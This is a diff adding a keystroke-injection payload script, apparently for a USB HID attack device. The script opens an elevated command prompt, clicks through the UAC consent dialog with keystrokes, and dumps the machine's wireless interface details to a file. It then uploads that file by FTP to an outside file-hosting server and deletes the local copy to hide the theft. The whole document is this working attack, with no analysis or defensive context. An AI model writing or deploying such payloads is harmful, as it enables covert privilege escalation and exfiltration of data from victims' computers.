@@ -1,0 +1,39 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 500
+TAB
+TAB
+ENTER
+DELAY 200
+STRING Netsh wlan show interfaces>networkinfo.txt
+ENTER
+DELAY 100
+STRING ftp 
+ENTER
+DELAY 200
+STRING o
+ENTER
+DELAY 200
+STRING ftp.drivehq.com
+ENTER
+DELAY 200
+STRING drivehqusername
+ENTER
+DELAY 100
+STRING drivehqpassword
+ENTER
+DELAY 200
+STRING put networkinfo.txt
+ENTER
+DELAY 200
+STRING bye
+ENTER
+DELAY 200
+STRING del networkinfo.txt
+ENTER
+DELAY 200
+STRING exit
+ENTER
